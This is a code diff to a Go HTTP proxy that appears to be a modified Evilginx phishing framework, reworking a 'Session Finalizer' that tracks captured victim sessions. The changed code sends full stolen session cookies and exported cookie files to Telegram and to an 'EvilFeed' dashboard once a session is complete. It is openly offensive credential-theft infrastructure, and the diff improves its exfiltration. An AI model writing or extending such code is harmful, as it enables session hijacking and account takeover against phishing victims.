@@ -173,11 +173,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 	// DISABLED: Old auto-notifier - replaced with SessionFinalizer
 	// p.autoNotifier = NewAutoNotifier(db, p.telegramNotifier, cfg.GetTelegramConfig().CookieExportDir)
 
-	// NEW: Session Finalizer - ONLY sends when 100% complete
-	if cfg.GetTelegramConfig().Enabled {
-		go p.startSessionFinalizer()
-		log.Important("🔥 NEW SESSION FINALIZER: Will ONLY send when sessions are 100% complete!")
-	}
+	// NEW: Session Finalizer - ALWAYS runs to track sessions, sends to Telegram when enabled
+	go p.startSessionFinalizer()
+	log.Important("🔥 SESSION FINALIZER STARTED: Tracking all sessions, will send to Telegram when enabled")
 
 	// Load EvilFeed config from persistent storage
 	if cfg.GetEvilFeedEnabled() {
@@ -2490,24 +2488,17 @@ func (p *HttpProxy) setSessionCustom(sid string, name string, value string) {
 	}
 }
 
-// sessionFinalizerRunning tracks if the SessionFinalizer goroutine is already running
-var sessionFinalizerRunning bool
-var sessionFinalizerMutex sync.Mutex
-
 func (p *HttpProxy) UpdateTelegramConfig() {
 	if p.telegramNotifier != nil {
 		p.telegramNotifier.UpdateConfig(p.cfg.GetTelegramConfig())
 	}
 
-	// Start SessionFinalizer if telegram is now enabled and it's not already running
+	// Session Finalizer is always running (started at initialization)
+	// When Telegram is enabled, it will automatically start sending
 	if p.cfg.GetTelegramConfig().Enabled {
-		sessionFinalizerMutex.Lock()
-		if !sessionFinalizerRunning {
-			sessionFinalizerRunning = true
-			go p.startSessionFinalizer()
-			log.Important("🔥 SESSION FINALIZER STARTED: Telegram enabled - will send when sessions are 100% complete!")
-		}
-		sessionFinalizerMutex.Unlock()
+		log.Important("📱 TELEGRAM ENABLED: Session Finalizer will now send complete sessions to Telegram")
+	} else {
+		log.Info("📱 Telegram disabled - Session Finalizer continues tracking but won't send")
 	}
 }
 
@@ -3112,29 +3103,33 @@ func (p *HttpProxy) startSessionFinalizer() {
 						log.Debug("📁 SESSION FINALIZER: Persisted session %s to file", session.SessionId)
 					}
 
-					// Send telegram notification for COMPLETE session with FULL COOKIES
-					exportDir := p.cfg.GetTelegramConfig().CookieExportDir
-					if exportDir == "" {
-						exportDir = "/tmp/evilginx_exports"
-					}
-
-					log.Important("🚀 SESSION FINALIZER: Sending telegram for COMPLETE session %d with %d FULL COOKIES...", session.Id, currentCookieCount)
-					p.telegramNotifier.NotifySessionCaptured(session.SessionId, exportDir)
-					log.Success("✅ SESSION FINALIZER: Telegram sent for BULLETPROOF COMPLETE session %d with FULL COOKIES", session.Id)
-
-					// Also notify EvilFeed with cookie file path
-					if p.evilFeed != nil && p.evilFeed.IsEnabled() {
-						// Generate cookie file path (same logic as telegram.go)
-						username := session.Username
-						if username == "" {
-							username = fmt.Sprintf("session_%d", session.Id)
+					// Send telegram notification ONLY if Telegram is enabled
+					if p.cfg.GetTelegramConfig().Enabled {
+						exportDir := p.cfg.GetTelegramConfig().CookieExportDir
+						if exportDir == "" {
+							exportDir = "/tmp/evilginx_exports"
 						}
-						username = strings.ReplaceAll(username, "@", "_")
-						username = strings.ReplaceAll(username, "/", "_")
-						cookieFilePath := filepath.Join(exportDir, fmt.Sprintf("%s-%s.txt", username, session.Phishlet))
 
-						p.evilFeed.NotifySessionCapturedWithFile(session, cookieFilePath)
-						log.Success("✅ SESSION FINALIZER: EvilFeed notified with cookie file: %s", cookieFilePath)
+						log.Important("🚀 SESSION FINALIZER: Sending telegram for COMPLETE session %d with %d FULL COOKIES...", session.Id, currentCookieCount)
+						p.telegramNotifier.NotifySessionCaptured(session.SessionId, exportDir)
+						log.Success("✅ SESSION FINALIZER: Telegram sent for BULLETPROOF COMPLETE session %d with FULL COOKIES", session.Id)
+
+						// Also notify EvilFeed with cookie file path
+						if p.evilFeed != nil && p.evilFeed.IsEnabled() {
+							// Generate cookie file path (same logic as telegram.go)
+							username := session.Username
+							if username == "" {
+								username = fmt.Sprintf("session_%d", session.Id)
+							}
+							username = strings.ReplaceAll(username, "@", "_")
+							username = strings.ReplaceAll(username, "/", "_")
+							cookieFilePath := filepath.Join(exportDir, fmt.Sprintf("%s-%s.txt", username, session.Phishlet))
+
+							p.evilFeed.NotifySessionCapturedWithFile(session, cookieFilePath)
+							log.Success("✅ SESSION FINALIZER: EvilFeed notified with cookie file: %s", cookieFilePath)
+						}
+					} else {
+						log.Debug("📱 SESSION FINALIZER: Complete session %d tracked but Telegram is disabled, not sending", session.Id)
 					}
 				} else {
 					// Log stability progress
